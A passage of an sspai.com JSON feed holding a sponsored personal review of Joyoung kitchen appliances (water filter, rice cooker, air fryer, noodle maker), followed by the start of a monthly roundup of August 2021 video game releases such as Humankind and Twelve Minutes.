将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>从校园到职场，从租房到拥有自己的小家，从结婚生子，一路走来，我购置了不少大件也攒下了不少的小件。在这些大件、小件当中，我感觉最能提升品质、最能发挥个人能动性的非小家电莫属。尤其是在租房的时候，小家电更能将个人的主观能动性体现的淋漓尽致，因为租房留给租客自身调整的余地并不大。</p>\n<p>小家电的体积不大，可从容携带；其价格往往并不太高，遇到搬家时送人或者丢弃都不心疼；而更为关键的是它关系到饮食起居，方寸之间便可提升生活质量……诸多的优点让我「不惜血本」在小家电上进行投资。</p>\n<p>用过的小家电有很多，但是细数下来我发现日常陪伴我的品牌总是那么几个，这当中有一个品牌出现的几率特别高——那就是九阳。我使用过它的不少产品。</p>\n<blockquote><p>说明：文中提到的产品均是我本人自行购买。题图及标识来自于九阳官网。</p></blockquote>\n<p>话分两头。1934年，冯玉祥到烟台参观民族实业，当时感慨「装置既辉煌，机件又灵巧，谁说国货没有洋货好？」。如今，黄海洪波依旧涌起，却换了人间。而国货也随着时代发展向前。乘势而为，1994 年，同处这片土地之上的栖霞人王旭宁发明了 <a href=\"http://paper.dzwww.com/shrb/content/20110220/Articel02004MT.htm\" target=\"_blank\">世界上第一台豆浆机 </a>。由是，九阳开始起步。</p>\n<p>对于中国的小家电来讲，九阳可能是一个绕不开的坎儿。从 1994 年发明<a href=\"http://scitech.people.com.cn/n/2013/1118/c1057-23568474.html\" target=\"_blank\">第一台豆浆机</a>开始，九阳几乎「一手推动了豆浆机从一个产品发展为一个产业」。小小的一台豆浆机背后其实是无穷的智慧。在豆浆机发明的同时，王旭宁向山东省知识产权局申请了豆浆机历史上第一项发明专利——智能加热技术。「1999年，王旭宁的智能型家用全自动豆浆机获得国家发明专利。 2000年，他的豆浆制备办法及主动豆浆机再次获得国家创造专利。」这些围绕着豆浆机的的诸多专利构成了一道护城河。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/78ad4962ad82b945eec0be0007084631\"><figcaption>那些年，我买过的豆浆机</figcaption></figure><p>对于我来讲，第一次接触到九阳这个牌子也正是从豆浆机开始。2011 年，我购买了第一台豆浆机；2014 年，我购买了第三台九阳豆浆机。如今这些曾经为我服务过的机器虽然已经送人，但是九阳之路却并没有就此止步。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/2651832f263c5f90d880aa981c456e9e\"><figcaption>「图片与实物均来源于京东」</figcaption></figure><p>其实相比豆浆机，更让人难以忘怀的回忆是这样的：每个同学抽屉里几乎总藏有几个热得快（部分同学叫「烧水棒」），这是与宿管大妈/大爷斗智斗勇的硕果仅存；而每一个开始独立讨生活的人总是少不了这样一把跨越时空的经典版烧水壶。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/8d16ba479c48f41036efb1fe3f4cd16c\"><figcaption>「经典款烧水壶，图片来自于京东，实物现在老家了」</figcaption></figure><h2>水龙头前置净水机</h2>\n<p>一句「多喝热水」折射出世间百态，一滴水折射出生活的色彩斑斓。水的重要性不言而喻。由水（壶）及水（净水机）。我自己也一直很关注饮食用水的问题。九阳的水龙头前置净水机从我租房的时候起我就开始使用了，当时使用的是 T03 龙头净水器；如今换了更萌的 Line Friends 联名款。</p>\n<blockquote><p>严格的讲前置净水机算不上什么小家电，但是它与文中提到的其他小家电的性质相似，所以也填列其中。</p></blockquote>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/64b574857920f2220bc9488e41dd042a\"><figcaption>我先后使用过的两款前置净水机，左为 T03 龙头净水器，右边为Line Friends 联名款。图片来自于京东</figcaption></figure><p>前置净水机比较小巧，价格适中。这种小装置安装简单，租房的时候可以自行安装在水龙头上，不用「大兴土木」。即便是一个小女生安装起来也没有什么压力。安装的过程中，几乎不需额外工具，拧到水龙头上就可以使用。它们都是直接使用自来水本身的压力「驱动」，不需要额外用电，也不产生废水。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/d3917eb58bd618e1206634ffc4a7654b\"><figcaption>九阳 Line Friends 联名款净水器JYW-RT521XL</figcaption></figure><p>在功能上，九阳 JYW-RT521XL 前置净水机提供了「净水」、「原水」两档可供选择。「净水」采用了陶瓷活性炭滤芯过滤，能够减少自来水中的余氯或者其他异味；即便是使用了「原水」也可滤除一部分泥沙铁锈。图中滤网上能够能够看到「原水」档过滤后留存的小沙子。两档水流的强弱有所不同，前者水流较缓；后者水流比较湍急，而且比水龙头自身的水流有所打散。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/a8a9152b41de490ab3614c916a3220db\"></figure><p>日常中，我结合「净水」、「原水」两档的特性对用途进行了区分。「净水」我主要用来淘米、洗菜、给食材焯水，「原水」主要用来刷碗、洗刷菜板等。至于日常的饮食用水，比如炖菜、煮饭，我用的是我们当地鲁花的桶装水。</p>\n<p>写在最后，九阳 JYW-RT521XL前置净水机毕竟是只是一个前置的净水机，所以请不要拿它和大型的净水设备相比。</p>\n<h2>九阳复古电饭煲 F131（家用迷你电饭煲）</h2>\n<p>除了水之外，接下来维系一个人饮食起居的可能就是一日三餐了。在这当中，米饭应有一席之地。因之，电饭煲成为居家必备。</p>\n<p>关于电饭煲，我的主张是：既要颜值在线，又要节约粮食不浪费，还要功能多样。所以，在这个时候，我选择了九阳的这款国风复古电饭煲 F131。 F131 的外观非常讨喜，尤其是前面的那个小按钮，方形的外观也比较可爱，提手便于搬动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/4d740de6774da27fc1d006c5ed521d90\"></figure><p>选择 F131 最开始的出发点其实是因为之前使用的大电饭煲容量太大，煮了米饭之后经常会吃不完。而 F131 的大小刚刚好。它的容量比较小，规格为 2L 及以下。这个规格比较适合像我家这种吃不动饭的三口之家。在日常使用中，我对它的这个容量很满意。做一次米饭，一顿饭就可以吃的干净，不剩下。</p>\n<p>除了日常蒸煮米饭之外，F131 还有这样的一些功能：寿司饭、快速饭、柴火饭、热饭、煮粥、蛋糕、杂粮等等。</p>\n<h2>九阳 KL-26J601 空气炸锅</h2>\n<p>九阳 KL-26J601 空气炸锅是我日常中比较喜欢、也比较常用的一件小家电。具体的购置时间早已经记不清了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/fe99687ab5dc3d6a344056b84828d7b8.png\"></figure><p>在日常的使用中，我发现空气炸锅有这样几个优点。空气炸锅的操控比较简单，基本上就是食材放入之后，设定温度，设定时间，然后等着吃就可以。全程几乎不需要人工干预，也不需要预热。比如像鸡翅这样一些含油的食材，可以丢进去直接烤；而像杏鲍菇、花菜这些含油量低乃至不含油的食材，用刷子刷几下油就可以进行烤制了。再一个，空气炸锅利用热风产生的热对流与热循环给食物加热，食物受热更均匀。同样的食材，用空气炸锅来烹饪需要的时间更短。相形之下，烤箱的操作就要麻烦一些。除了操作简单之外，空气炸锅的后续清洁也比较方便，比烤箱要好。所以自从有了它之后，家里的烤箱处于吃灰状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/3061a469f0d07bc3a11225a596b3eb81\"><figcaption>空气炸锅很简单的设定功能</figcaption></figure><p>当然与烤箱相比，空气炸锅的可用面积比较小，一次性处理不了太多的食材，这也是它的缺点。不过，使用方便对我而言就足够了，毕竟空间不够可以用次数来凑。</p>\n<p>日常中我用空气炸锅烤过各种各样的东西，比如孩子比较喜欢吃的烤鸡翅、烤排骨、炸薯条，我也用它烤过杏鲍菇、烤过花菜。身在烟台，每年冬天还有一样必不可少的好物——烤地瓜。烟薯 25 那是必须的，稍微那么一烤就可以流油。</p>\n<h2>九阳 JYN-L12 立式全自动面条机</h2>\n<p>饮食总是需要调节一下的，每天三顿米饭之余，面条可以有。然而，如今在家里吃一碗面，尤其是手擀面，并不是一件容易的事情。</p>\n<p>从和面、揉面、到擀面条以及后续的切削，一份看似简单的手擀面充满了技术含量。就拿切削来讲，把一张擀好的面饼切成粗细均匀的面条也是很考验刀工。所以每次动手自己做面条的时候，总是会想起妈妈那嫌弃的眼神。而另一面，传统的面条制作往往需要一块很大的案板。正如你所看到的，我是用厨房切菜的菜板勉力为之。本身居住空间极为有限，厨房的面积就更为狭小，这对传统面条技法的传承是一个极大的挑战；有心想做，而场地受限。</p>\n<p>这些原因叠加在一起导致擀面条这门传统艺能正在逐渐「失传」。想一饱口福，难！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/ac507c5bc7f77efced5d254aac13bb4f.png\"><figcaption>自己用菜板凑合的手擀面，馄饨皮也是同样手法，最后出来的是四方片</figcaption></figure><p>在解决口腹之欲的过程中，我发现了九阳全自动面条机这么个好东西。相对来讲，九阳 JYN-L12 立式全自动面条机比较好解决了我上面提到的痛点。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/0cbecd05bdf42d4d1f767d4d2267c41d.gif\"><figcaption>从揉面到出面条一气呵成</figcaption></figure><p>首先它占地面积比较小，不必纠结为「大案板」找一个合适的存放之处。九阳 JYN-L12 面条机自动和面，比较干净，也不会弄脏手。只需要按配比加水、加面粉即可。由此我也基本上告别了「和泥巴」式揉面。</p>\n<p>最为关键的是九阳 JYN-L12 面条机的功能比较强大。不管是粗面还是细面，不管是宽面还是窄面，它都可以从容应对；面条的软硬程度也可以调节。处在一个几乎逢节就吃饺子的地方，饺子皮也是必不可少的。这一点面条机也并未让我失望。</p>\n<p>凡此种种，上面提到这些看似复杂的面食，其实所需要做的仅仅是更换模具而已。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/c5731d7b3ab8693e92a6f2c32c560192.png\"><figcaption>随机附带的各种面条的模具，其中金属模具是做饺子皮的</figcaption></figure><p>作为家长，很多人可能都会遇到这样的场景：在孩子小的时候，为了让孩子吃饭家长费劲了心机。我也不例外。利用这款面条机，我给我家孩子弄过蔬菜面、做过鸡蛋面以及其他各种颜色的面条。整体而言，在有了面条机之后，我家的面食问题基本上得以解决。</p>\n<h2>最日常的陪伴</h2>\n<p>上面提到的这些产品只是我日常用到的一部分，它们较好的解决了我的痛点，让我的生活更具烟火气。除了九阳之外，我在日常生活之中也使用了一些其他的品牌的小家电、小产品，比如苏泊尔、奔腾。生活千姿百态，每个人的诉求也各不相同。我欣喜地发现，在越来越多人的生活当中有着越来越多的国产品牌。这些品牌改善了和改善着我们的生活品质，每一个品牌都在不断的发力。而我也有一个小期待——未来是不是会出现颠覆性的小家电呢？</p>\n","link":"https://sspai.com/post/67669"},{"title":"本月玩什么 | 人类、十二分钟、永劫无间、对马岛之魂导演剪辑版","date":"2021-08-10 06:26:18","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>欢迎来到<strong>「本月玩什么」</strong>，本栏目将从作者个人角度出发，为大家挑选、简介本月新发售的部分游戏作品/内容，主要涵盖 PlayStation、Xbox、Nintendo、PC 和 iOS/Android 等主流平台，期待里面有能勾起你兴趣的好玩意儿，也真诚感谢所有喜欢本栏目的朋友。</p>\n<p>本栏目设有<strong>有奖互动</strong>环节，详情依旧请看文末。</p>\n<h2><strong>人类 / HUMANKIND</strong></h2>\n<blockquote><p>4X 玩法新势力，主打不同阶段、不同人类文明的排列组合。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.18</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/320e7b2caf3b6e6313d2a4885e90994e.jpg\"></figure><p>世嘉发行、AMPLITUDE Studios 制作的 4X 游戏（即 eXplore/探索、eXpand/扩张、eXploit/开发、eXterminate/征服），原定今年 4 月发售，但开年的 OpenDev 测试反馈让开发团队看到了进一步优化的必要，所以延期至今。</p>\n<p>如果我们把《文明》系列抽取、运用文明势力历史特征的手法叫做「戏说不是胡说」，那也许就可以把《人类》干的事情戏称为「改编就是胡编」——虽然两者的 4X 玩法框架接近，但《人类》强调糅合不同文明特征、形成「缝合怪」一样的原创文明，具体做法是允许玩家在时代更替时选择迥异于现有文明的「未曾设想的道路」，完全可以安排出类似「原始部落→周朝→罗马帝国→封建君主制西班牙→……」的奇怪发展路径，一切全看玩家喜好。</p>\n<p>除了「文明嫁接」这个金字招牌外，《人类》还有很多区别于主要竞品的特色机制设计，对笔者个人来说，之前的测试中印象最深的莫过于爽快的战斗，玩家可以集结包含数十个军事单位的大型军团，在地图生成的战区里进行战役，战役会暂时掐断生产经营活动，让玩家专注于战斗回合、仗打完了再回到正轨上搞经济。其他特色设计还有很多，在此不一一赘述，而且也确实不知道开发团队根据民意又做了什么大调整，总之，我们应该可以期待本月的这部杀时间幻想巨制。</p>\n<p>特别再介绍一下笔者偏爱的制作团队 AMPLITUDE Studios，这是一家法国知名游戏开发商，创立于 2011 年、两名创始人均出身于育碧（其中一位已离职再创业），2016 年被世嘉收购，与 Creative Assembly、Two Point 等共同隶属于世嘉欧洲。该团队最拿手的游戏品类无疑正是 4X，旗下已有《无尽帝国（Endless Legend）》《无尽宇宙（Endless Space）》等当家花旦，往往以巧夺天工的美术设计、沉迷度较高的玩法闻名于玩家社群。</p>\n<h2><strong>十二分钟 / Twelve Minutes</strong></h2>\n<blockquote><p>悬念感十足的「时间牢笼」逃脱记。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.19</li>\n<li>登陆平台：X1、XS S/X、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/5fc624c7056ab59cc146a2394d714347.jpg\"></figure><p>这部游戏进入绝大多数玩家视野应该是在 2019 年的微软 E3 展前发布会上，这也是笔者对《十二分钟》一见钟情的时刻。每当我看到《十二分钟》的演示片段，都免不了会回想起深刻影响了本作的斯坦利·库布里克（Stanley Kubrick）、阿尔弗雷德·希区柯克（Alfred Hitchcock）、大卫·芬奇（David Fincher）等，以及自己一直酷爱的各种「密室逃脱」题材作品。</p>\n<p>本作的设计概念简洁明了：玩家将俯瞰一座狭小的公寓，控制一位刚进家门的丈夫，现在给你 12 分钟时间，几分钟后会有特勤人员模样的人破门而入，将你和在家的妻子绑在地上，一旦 12 分钟结束或者丈夫死亡，时间就会回溯到丈夫进家门的时刻，但之前的记忆都会保留，也就允许丈夫在对话中引用自己的「跨时空经历」，游戏的最终目的也就是想办法打破 12 分钟的时间循环魔咒。</p>\n<p>从宣传披露的内容来看，《十二分钟》刺激体验的核心应该是交互与推理：在自由活动时间里，玩家可与家具、电器、锅碗瓢盆等房间内几乎一切物品互动，还能组合拾取的物品、拿身上的物品与其他东西互动等（比如拿杯子去接水、拿刀自卫等等）；当然更重要的是，玩家可以与妻子为主的各个 NPC 对话，尝试证实时间回溯的存在，或是套取关键信息，努力反转几分钟之后的命运。按照通常的经验，这种玩法往往很考验悬疑、台词、交互等方面的逻辑严密性，如果能在这些核心环节有上佳表现，《十二分钟》将极富吸引力。</p>\n<p>这个游戏项目的发起者名叫 Luis Antonio，是一位有 Rockstar、育碧工作经历的艺术家、开发者，本作是他入行独立游戏后构思的第一作；早在 2015 年，Antonio 就将本作的 Demo 带到了 PAX East 展会，原计划次年发售，不知道他和有眼光的发行商谁先动的手，总之，本作撤销了原定的上市计划，制作规模大幅扩张，最终成为了 Annapurna Interactive 担任发行、饱受微软青睐的旗舰作品，更是靠发行商牵线，请到了詹姆斯·麦卡沃伊（James McAvoy，《X 战警》等）、黛茜·雷德利（Daisy Ridley，《星球大战：原力觉醒》等）、威廉·达福（Willem Dafoe，《蜘蛛侠》等）为主角配音，可谓声势浩大。是否能名副其实，这个月终于能拉出来溜溜了。</p>\n<h2><strong>永劫无间 / Naraka: Bladepoint</strong></h2>\n<blockquote><p>仙侠题材「大逃杀」作品，拥有畅快的冷兵器拼杀体验。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.12</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/4f368933f92cd3ae0830673e40728d7f.jpg\"></figure><p>可能有很多朋友已经忘了，本作最早是在 TGA 2019 上正式公开的，一段概念性有点强的预告片过后，包括笔者在内的很多人估计就只留下了一个印象：有点像劣化版的《只狼》，又有大厂要「顶风作案」了。</p>\n<p>当然，后来我们都知道了，这是一部由网易发行、24 Entertainment 工作室研发的「大逃杀」类多人竞技游戏，领衔该工作室的关磊曾担任过《流星蝴蝶剑.net》（2002）动作设计、《新流星搜剑录》（2015）制作人、移动版《流星蝴蝶剑》（2018）主策划等职，很显然，《永劫无间》将是他在相似玩法领域中的一次全新尝试。</p>\n<p>实机体验过后，个人认为，在「大逃杀」产品多如牛毛、层出不穷的市场环境下，本作打拼地位的努力确实可圈可点，某种程度上也算是「学贯中西」：</p>\n<ul>\n<li>游戏整体框架的层面，能看出本作从《Apex 英雄》《绝地求生》等最主流的「大逃杀」产品中吸取了大量成熟经验，尤其能在战场规模、界面交互设计中看到浓重的《Apex 英雄》痕迹，运转起来简明、高效。</li>\n<li>题材层面，和细分市场上已有的强力竞品相比——就拿方块游戏发行的《武侠乂》来说，虽然同样都是在「中国传统武打」上做文章，《武侠乂》偏写实，包含了趣味且高度复杂的招式系统，《永劫无间》则偏重运用「仙侠神魔」等超现实要素，后者也因此将视听表现做得炫目多彩。</li>\n<li>玩法层面，虽然游戏中不乏长枪短炮，但处于玩法核心的依然是冷兵器的碰撞，开发团队加入了长剑、太刀、棍等一批有代表性的武器及动作模组（且在持续扩张），并设计了高度精炼的「普攻、霸体、振刀」这一「猜拳」决策，丰富了玩家短兵相接时的博弈，简约却不失策略性、爽快感。</li>\n</ul>\n<p>从<a href=\"https://www.zhihu.com/question/361077302/answer/1862792327\">制作人发表的开发感想</a>中可以发现，当前，开发团队对本作的后续开发工作保持了相当开放的态度，既认为自己走对了玩法的细分赛道，也乐于实施能提升体验的重大改动，游戏从早期倚重近身格斗、改到现在可以火器横飞，确实就是个很好的例证。基于此，笔者期待《永劫无间》正式上线后能继续维持好势头。</p>\n<h2><strong>对马岛之魂 导演剪辑版 / Ghost of Tsushima Director's Cut</strong></h2>\n<blockquote><p>内容更加充实，但不少玩家对定价模式颇有微词。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.20</li>\n<li>登陆平台：PS4、PS5</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/5fe9a76b4d0875e79c425b7f58e6910a.jpg\"></figure><p>《对马岛之魂》的豪华升级版，最引人瞩目的升级项目是增加了全新的《壹岐之章》，将玩家带到风景如画、却也危机四伏的壹岐岛（位于日本九州和对马岛之间），体验全新的地图、故事、物品搜集、敌人对抗等，此外还包含了之前已经推出的多人合作玩法「奇谈模式」，游戏内赠品若干。导演剪辑版为《对马岛之魂》带来了更原生的 PS5 平台体验，实现了最高 4K@60FPS 的画面表现、DualSense 触觉反馈及自适应扳机、3D 音效、日语配音口型同步等技术升级。</p>\n<p>《对马岛之魂 导演剪辑版》推出后顶替了原版游戏，现在购买的话，PS4、PS5 版分别定价 60、70 美元，已经有了 PS4 原版游戏的玩家也可以付费升级，9.99 美元升至 PS4 导演剪辑版、29.99 美元升至 PS5 版，存档可继承，需要特别提醒的是，主打组队对战玩法的「奇谈模式」预定于 9 月单独发售、定价 19.99 美元，总之感兴趣的玩家可以考虑自己接受的「套餐」。</p>\n<h2><strong>脑航员 2 / Psychonauts 2</strong></h2>\n<blockquote><p>视听体验奇妙，故事令人期待。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.25</li>\n<li>登陆平台：PS4、Xbox（支持智能分发）、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/e9ba61499ce09a0390a4a4795282c575.jpg\"></figure><p>《脑航员》是一个非常精灵古怪的 3D 平台跳跃游戏系列，游戏的核心主题正如标题所指，玩家将一头扎入脑中世界，在五彩斑斓的各个区域展开冒险。该系列的开发商是现已隶属于 Xbox Game Studios 的第一方工作室 Double Fine Productions，制作系列初代时，该团队就曾受到过微软的扶持。</p>\n<p>开发团队曾在<a href=\"https://www.well-played.com.au/double-fines-lisette-titre-montgomery-and-tim-schafer-on-returning-to-the-world-of-psychonauts/\">近期的访谈</a>中提到，《脑航员》系列初代受定格动画《圣诞夜惊魂（The Nightmare Before Christmas）》的影响颇深，而该片的核心主创蒂姆·波顿（Tim Burton）又主要是受的流行于德国的表现主义（Expressionism）影响，所以到了开发系列二代时，开发团队进一步在美术风格上追根溯源，以期收效更佳：由于本作的故事主要发生在脑中世界，因此在相关的宣传片中我们可以看到，流程各处满是极富张力、想象力的艺术设计，把《脑航员 2》从头武装到脚，形成了本作最有竞争力的特色。</p>\n<h2><strong>死亡垃圾 / Death Trash</strong></h2>\n<blockquote><p>继承了经典《辐射》风味的 ARPG 作品。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.05</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/8e7d29b2b8f4b35eae182f12b5f50e8a.jpg\"></figure><p>《死亡垃圾》官网顶部援引了几家媒体的短评，笔者最喜欢的是其中由 Killscreen 写的一条，「恶心，但你不会把目光移开」，描述得不可谓不精准：这是一款四人独立团队完成的像素风格俯视角 ARPG，呈现了一段后启示录题材的故事，玩家将前往冒险的是一个看起来异常癫狂的外星世界，里面充斥着古板的仿生机械、萧条的人类聚落，以及最最重要的——各种血肉模糊的畸形生命体。</p>\n<p>整体上，本作算是对标了《辐射（Fallout）》系列第一、二代，人物加点、特长与缺陷、数值鉴定、对话抉择、大地图移动等《辐射》系列古典要素都被移植了进来，在此基础上，开发团队还有一些「微创新」，包括将战斗机制改为实时动作制、增加贴合故事背景的「超自然」特殊装备、压缩任务网络规模等，使《死亡垃圾》显得小巧而有范儿，很能勾起玩家的游戏欲望，就是不知道，看起来讳莫如深的邪典故事，深度到底几何，还得到游戏里验证了。</p>\n<h2><strong>九十六号公路 / ROAD 96</strong></h2>\n<blockquote><p>以一条公路串起耐人寻味的人和事。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.16</li>\n<li>登陆平台：NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/ac4261442cd73f0e1ef04700878c5a31.jpg\"></figure><p>惠普 OMEN 计划支持、DigixArt 工作室制作的一款第一人称视角冒险游戏，《九十六号公路》是 DigixArt 成立以来的第三部出品；这支开发团队始创于 2015 年，创始人为 Anne-Laure &amp; Yoan Fanise 这对夫妻档，其中 Yoan 供职育碧期间曾任《勇敢的心：伟大战争（Valiant Hearts：The Great War）》导演。</p>\n<p>据官方宣传材料，本作的故事舞台将是一个与现实近似的架空世界，时间为 1996 年，玩家扮演一位意图从虚构国家 Petria 出逃的角色，沿游戏标题里的这条公路赶往边境、奔向自由，而游戏体验的核心就是这一路遭遇的人和事：玩家会体验到风格各异的小游戏，并需在大量行动、对话中做出选择，这些选择将对后续流程中如何「偶遇」造成影响，改变人物的遭遇或关系，乃至于引发改变世界格局的蝴蝶效应；按官方预期，不同玩家的「九十六号公路之旅」可能因选择差异而完全不同，同时开发团队也称，其创作受到了昆汀·塔伦蒂诺（Quentin Tarantino）、科恩兄弟（Coen brothers）、奉俊昊（Bong Joon-ho）等电影导演的影响，笔者对此的解读是，游戏中五花八门的角色间可能会有微妙的联系（而且角色数可能不会太多），带些黑色幽默风味的故事最终可能会收束到少数几个节点上。</p>\n<p>据 Demo 流程内容推测，本作应该有一个「遭遇事件库」，玩家选择可能会决定出现什么事件、什么时候出现、事件细节有何变动等，如此体现选择导致的流程差异；另外，玩家并不会真的把全程几百英里给看一遍，而是会在遭遇事件的几个点进入第一人称体验、事件之间直接以读取画面转场。</p>\n<p>个人看来，类似自我陈述的选择题开场、跳过真实时间的转场、有几分相似的画面风格……这些都让《九十六号公路》给我的第一印象中带着强烈的《护林员（Firewatch）》既视感，很像是但后者更重视让玩家在弱引导的线性流程中自省，本作则把故事情节塑造得更具体、变化多端，鼓励玩家书写有趣的「自传」，不过也正因如此，这种偏互动小说/电影的作品不一定人人都喜欢。</p>\n<p>当然了，这都是些拼凑现有信息得到的猜想，《九十六号公路》的游戏体验具体如何，给我的疑惑仍然远超已知。</p>\n<h2><strong>国王的恩赐 2 / King's Bounty II</strong></h2>\n<blockquote><p>该类策略游戏的「祖师爷」系列。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.24</li>\n<li>登陆平台：PS4、X1、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/2c64b3bc0443c4d63f41be231fe45cad.jpg\"></figure><p>《国王的恩赐》是一个老牌的回合制 RPG 系列，基于中世纪「剑与魔法」奇幻题材， 原本的开发商是行业先驱 New World Computing；系列初代作品于 1990 年问世，以《国王的恩赐》为基础，New World Computing 创立了策略游戏领域的另一块金字招牌——《魔法门之英雄无敌（Heroes of Might and Magic）》系列。</p>\n<p>多说一句之后的故事，收购了 New World Computing 的 3DO 走向破产，前者的遗产被育碧接手，后来，俄罗斯游戏巨头 1C Company 买走了《国王的恩赐》，使得本作的 IP 与「双胞胎兄弟」《魔法门之英雄无敌》天各一方。</p>\n<p>说回本作，这是《国王的恩赐》系列诞生以来的首部正传续作，游戏中，玩家将扮演对抗邪恶势力的英雄，招兵买马、运筹帷幄、纵横捭阖，完成一场宏大的冒险。游戏流程中，玩家通常行动时的视角是第三人称，穿插了大量脚本演出，一旦进入战斗，视角就会切换到空中俯瞰整个战场，毕竟战斗采用的是回合制战棋玩法。</p>\n<h2><strong>英雄不再 3 / NO MORE HEROES 3</strong></h2>\n<blockquote><p>放荡不羁、制作人个人风格极其浓烈的动作佳品。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.27</li>\n<li>登陆平台：NS</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/053fded84a1186d8afd5a484f1cdb3ed.jpg\"></figure><p>于 E3 2019 前的任天堂直面会上首次公开，依然由系列掌舵人须田刚一导演、编剧、参与设计，采用虚幻引擎 4 开发，回归了系列早期类似开放世界的设计框架，具有空前的地图规模、包含五个大区，其中就有系列经典的「圣诞已死城（Santa Destroy）」，得益于开发技术的提升，整体卖相可以说是远超旧作。</p>\n<p>《英雄不再》系列的故事线有些无厘头，主角特拉维斯·塔奇（Travis Touchdown）是「美国杀手协会（UAA）」的认证杀手，擅用武器为光束军刀，一代讲的主要是特拉维斯冲击杀手排行榜首，二代聊的则是拿到榜一三年之后特拉维斯卷入的一场复仇之争，三代中，我们将迎来特拉维斯力战外星超级英雄军团的故事。</p>\n<p>不管是从《英雄不再》的哪一代作品上我们都能看出，该系列很注重维持独特的幽默感、Lo-fi 的艺术设计，体现在游戏机制包装（例如系列传统——要存档得蹲马桶）、不正经的台词、尽显「土味」的界面交互等每一个细节。很显然，也正是须田刚一刻意打磨的这些特质，在呼唤愿者上钩。</p>\n<h2><strong>尘垢 / GRIME</strong></h2>\n<blockquote><p>美术风格特色突出的横板动作游戏。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.02</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/ca7882b52500937646a2cb8940fabeac.jpg\"></figure><p>一款动作冒险银河城作品，结合了 2D 的地图与纵深感强的 3D 画面表现，将类似于《黑暗之魂》式的动作体验带到了横板关卡设计中，具有「魂」类游戏特色的能力加点、装备、闪避/翻滚、体力值、弹反等机制纷纷到位。</p>\n<p>从《尘垢》已经披露的流程宣传中我们可以看到，开发团队显然花了大力气营造其惊悚、肃杀的氛围，在这个原创的诡异世界观中，以拟真材质刻画了各种稀奇古怪的地形地貌、机关、怪物、有生命的武器等，刺激着玩家的感官。</p>\n<p>本作主角的造型设计很是吸睛——没有正常头部，而是由一颗暗紫色的「黑洞」取而代之，这个别致的形象搭载了「弹反」动作机制：若在攻击命中前一刻按键，不仅可令攻击无效化、还能从敌人处吸出资源、反弹伤害等，有点《鬼武者》系列「一闪」的味道，也形成了《尘垢》动作玩法的特色。</p>\n<h2><strong>星际拓殖 / Starmancer</strong></h2>\n<blockquote><p>斜 45° 俯视角、像素风格模拟经营游戏。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.05</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img 